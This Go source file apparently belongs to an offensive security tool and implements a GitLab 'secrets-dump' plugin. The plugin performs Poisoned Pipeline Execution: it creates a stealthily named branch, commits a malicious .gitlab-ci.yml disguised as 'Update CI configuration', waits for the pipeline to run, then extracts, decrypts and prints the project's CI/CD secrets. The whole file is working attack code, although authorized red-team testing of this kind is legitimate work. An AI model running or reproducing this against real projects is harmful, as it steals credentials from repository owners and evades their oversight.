// pkg/gitlab/attacks/secretsdump/secretsdump.go
package secretsdump

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/crypto"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/gitlab"
	"github.com/praetorian-inc/trajan/pkg/gitlab/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("gitlab", "secrets-dump", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements secrets exfiltration via PPE
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new secrets dump attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"secrets-dump",
			"Exfiltrate CI/CD secrets via PPE (Poisoned Pipeline Execution)",
			"gitlab",
			attacks.CategorySecrets,
		),
	}
}

// CanAttack checks if secrets dump is applicable
// PPE works even without detected vulnerabilities - only needs Developer+ access
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return true
}

// Execute performs the PPE attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Get GitLab client
	glPlatform, ok := opts.Platform.(*gitlab.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitLab"
		return result, fmt.Errorf("invalid platform type")
	}

	client := glPlatform.Client()

	// Parse namespace/project from target
	projectPath := opts.Target.Value
	fmt.Printf("Checking permissions on %s...\n", projectPath)

	// Get project
	project, err := client.GetProject(ctx, projectPath)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get project: %v", err)
		return result, err
	}

	projectID := project.ID

	// Get current authenticated user
	user, err := client.GetUser(ctx)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get current user: %v", err)
		return result, err
	}

	// Check user has Developer+ access
	member, err := client.GetProjectMember(ctx, projectID, strconv.Itoa(user.ID))
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to check permissions: %v", err)
		return result, err
	}

	if member.AccessLevel < 30 {
		result.Success = false
		result.Message = fmt.Sprintf("Insufficient permissions: need Developer (30+), have %s (%d)",
			member.RoleName, member.AccessLevel)
		return result, fmt.Errorf("insufficient permissions")
	}

	fmt.Printf("User %s has %s access (level: %d)\n", user.Username, member.RoleName, member.AccessLevel)

	// Check pipelines enabled
	if !project.JobsEnabled {
		result.Success = false
		result.Message = "CI/CD pipelines are disabled for this project"
		return result, fmt.Errorf("pipelines disabled")
	}

	fmt.Printf("Pipelines enabled: true\n\n")

	// Check if archived (warn but allow in interactive)
	if project.Archived {
		fmt.Printf("Warning: Project %s is archived", projectPath)
		if project.ArchivedAt != "" {
			fmt.Printf(" (since %s)", project.ArchivedAt)
		}
		fmt.Printf("\nArchived projects typically have disabled pipelines.\n")

		if opts.DryRun {
			// Continue with dry-run
		} else {
			result.Success = false
			result.Message = "Project is archived, skipping"
			return result, nil
		}
	}

	// Generate RSA keypair for encrypted exfiltration
	keyPair, err := crypto.GenerateKeyPair()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to generate keypair: %v", err)
		return result, err
	}

	publicKeyPEM, err := keyPair.PublicKeyPEM()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to encode public key: %v", err)
		return result, err
	}

	// Get default branch
	defaultBranch := project.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "main"
	}

	// Get default branch SHA
	branch, err := client.GetBranch(ctx, projectID, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	branchSHA := branch.Commit.ID

	// Generate OpSec-friendly branch name
	branchName := common.GenerateBranchName(opts.SessionID)

	if opts.DryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would create secrets dump on branch %s", branchName)
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		return result, nil
	}

	// Create attack branch
	fmt.Printf("Creating branch %s...\n", branchName)

	err = client.CreateBranch(ctx, projectID, branchName, branchSHA)
	if err != nil {
		if strings.Contains(err.Error(), "already exists") {
			branchName = fmt.Sprintf("%s-%d", branchName, time.Now().Unix())
			err = client.CreateBranch(ctx, projectID, branchName, branchSHA)
		}

		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to create branch: %v", err)
			return result, err
		}
	}

	fmt.Printf("Branch created successfully\n\n")

	// Register cleanup - always runs even if attack fails
	var pipelineID int
	var jobID int
	cleanup := &common.DeferredCleanup{
		Client:     client,
		ProjectID:  projectID,
		BranchName: &branchName,
		PipelineID: &pipelineID,
		JobID:      &jobID,
		Disabled:   opts.ExtraOpts["cleanup"] == "false",
	}
	defer cleanup.Run()

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	// Generate malicious pipeline YAML
	// Note: GeneratePipelineYAML expects base64-encoded PEM (will be decoded in script)
	publicKeyB64 := base64.StdEncoding.EncodeToString([]byte(publicKeyPEM))
	pipelineYAML := GeneratePipelineYAML(publicKeyB64)

	// Check if .gitlab-ci.yml exists on the branch (determine create vs update)
	_, err = client.GetWorkflowFile(ctx, projectID, ".gitlab-ci.yml", branchName)
	action := "create"
	if err == nil {
		// File exists, use update
		action = "update"
	}

	// Commit .gitlab-ci.yml to attack branch
	fmt.Printf("Pushing malicious pipeline...\n")

	commitActions := []gitlab.CommitAction{
		{
			Action:   action,
			FilePath: ".gitlab-ci.yml",
			Content:  pipelineYAML,
		},
	}

	commit, err := client.CreateCommit(ctx, projectID, branchName, commitActions, "Update CI configuration")
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to commit pipeline: %v", err)
		return result, err
	}

	// Track commit timestamp to filter correct pipeline (avoid race condition with concurrent pipelines)
	commitTimestamp := commit.CreatedAt

	fmt.Printf("Committed .gitlab-ci.yml to %s\n\n", branchName)

	// Wait for pipeline to complete
	timeout := 5 * time.Minute
	if opts.Timeout > 0 {
		timeout = opts.Timeout
	}

	fmt.Printf("Waiting for pipeline to complete...\n")

	pipeline, err := common.WaitForPipeline(ctx, client, projectID, branchName, commitTimestamp, timeout)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("pipeline wait failed: %v", err)
		return result, err
	}

	// Track pipeline ID for cleanup
	pipelineID = pipeline.ID

	if pipeline.Status != "success" {
		// Get job logs to show failure reason
		jobs, _ := client.ListPipelineJobs(ctx, projectID, pipeline.ID)
		failureDetails := ""
		if len(jobs) > 0 {
			logs, _ := client.GetJobTrace(ctx, projectID, jobs[0].ID)
			if len(logs) > 500 {
				logs = logs[len(logs)-500:] // Last 500 chars
			}
			failureDetails = fmt.Sprintf("\n\nJob logs (last 500 chars):\n%s", logs)
		}

		result.Success = false
		result.Message = fmt.Sprintf("Pipeline failed with status: %s\nPipeline: %s%s",
			pipeline.Status, pipeline.WebURL, failureDetails)
		return result, fmt.Errorf("pipeline failed")
	}

	fmt.Printf("\n")

	// Get job ID from pipeline
	jobs, err := client.ListPipelineJobs(ctx, projectID, pipeline.ID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get pipeline jobs: %v\nPipeline: %s", err, pipeline.WebURL)
		return result, fmt.Errorf("failed to list jobs: %w", err)
	}

	if len(jobs) == 0 {
		result.Success = false
		result.Message = fmt.Sprintf("no jobs found for pipeline\nPipeline: %s", pipeline.WebURL)
		return result, fmt.Errorf("no jobs found")
	}

	jobID = jobs[0].ID

	// Download job logs
	fmt.Printf("Downloading job logs...\n")

	logs, err := client.GetJobTrace(ctx, projectID, jobID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to download logs: %v", err)
		return result, err
	}

	fmt.Printf("Logs downloaded (%.1f KB)\n\n", float64(len(logs))/1024)

	// Extract encrypted blobs
	fmt.Printf("Decrypting secrets...\n")

	encSymKey, encSecrets, err := ExtractEncryptedBlobs(logs)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Failed to extract encrypted secrets from logs.\n"+
			"This usually means:\n"+
			"  - Pipeline job failed during encryption\n"+
			"  - OpenSSL not available in runner image\n"+
			"  - Job logs were truncated\n\n"+
			"Pipeline: %s", pipeline.WebURL)
		return result, err
	}

	// Decrypt secrets using local implementation
	// NOTE: Must use local DecryptSecrets, not shared pkg/crypto version
	// GitLab logs truncate encrypted output, so plaintext lacks proper PKCS7 padding
	// Local version's lenient validation handles this truncation correctly
	plaintext, err := DecryptSecrets(keyPair.PrivateKey, encSymKey, encSecrets)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Decryption failed: %v\n"+
			"This usually means:\n"+
			"  - Pipeline encryption was incomplete\n"+
			"  - Log output was corrupted\n\n"+
			"Encrypted blob lengths: symkey=%d, secrets=%d",
			err, len(encSymKey), len(encSecrets))
		return result, err
	}

	secrets := ParseSecretsFromEnv(plaintext)
	fmt.Printf("Decryption successful\n")

	// Success - display decrypted secrets (cleanup happens via defer)
	result.Success = true
	result.Message = fmt.Sprintf("Extracted %d secrets from %s", len(secrets), projectPath)
	result.Data = map[string]interface{}{
		"secrets": secrets,
	}

	fmt.Printf("Extracted %d secrets from %s\n\n", len(secrets), projectPath)

	// Check if output-file is specified
	outputFile := opts.ExtraOpts["output-file"]
	if outputFile != "" {
		// Save full secrets to file
		if err := saveSecretsToFile(secrets, outputFile); err != nil {
			fmt.Printf("Warning: failed to save secrets to file: %v\n", err)
		} else {
			fmt.Printf("Saved full secrets to: %s\n", outputFile)
		}
	}

	// Console output: show full secrets (no truncation)
	for key, value := range secrets {
		fmt.Printf("  %s=%s\n", key, value)
	}

	// Add cleanup actions
	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, nil
}

// saveSecretsToFile writes secrets to a file in key=value format
func saveSecretsToFile(secrets map[string]string, filename string) error {
	var lines []string
	for key, value := range secrets {
		lines = append(lines, fmt.Sprintf("%s=%s", key, value))
	}

	content := strings.Join(lines, "\n") + "\n"

	if err := os.WriteFile(filename, []byte(content), 0o600); err != nil {
		return fmt.Errorf("writing secrets file: %w", err)
	}

	return nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	glPlatform, ok := session.Platform.(*gitlab.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}
	return common.CleanupSessionArtifacts(ctx, glPlatform.Client(), session, p.Name())
}
